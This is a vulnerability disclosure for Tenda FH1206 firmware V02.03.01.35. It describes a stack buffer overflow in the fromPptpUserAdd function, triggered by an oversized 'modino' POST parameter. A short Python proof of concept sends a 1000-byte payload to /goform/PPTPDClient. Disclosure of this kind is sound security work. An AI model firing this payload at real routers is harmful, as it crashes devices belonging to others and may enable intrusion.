## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2905.html

## Affected version

FH1206 V02.03.01.35

## Vulnerability details

The Tenda FH1206 V02.03.01.35 has a stack overflow vulnerability located in the `fromPptpUserAdd` function. This function accepts the `modino`  parameter from a POST request. The statement ` sprintf(v20, "vpn.ser.pptpuser%s", v6)`and` sprintf(v16, "1;%s;%s;%s;%s;%s;%s;%s", v6, v11, v17, v10, v8, v7, v5);` leads to a buffer overflow. The user-supplied `modino` can exceed the capacity of the `v16 `array and`v20`array , thus triggering this security vulnerability.

![image-20240802202434781](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240802202434781.png)

## POC

```python
import requests

ip = "192.168.84.101"
url = "http://" + ip + "/goform/PPTPDClient"
payload = b"a"*1000

data = {"modino": payload, "flag": "0"}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240801202321673](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240801202321673.png)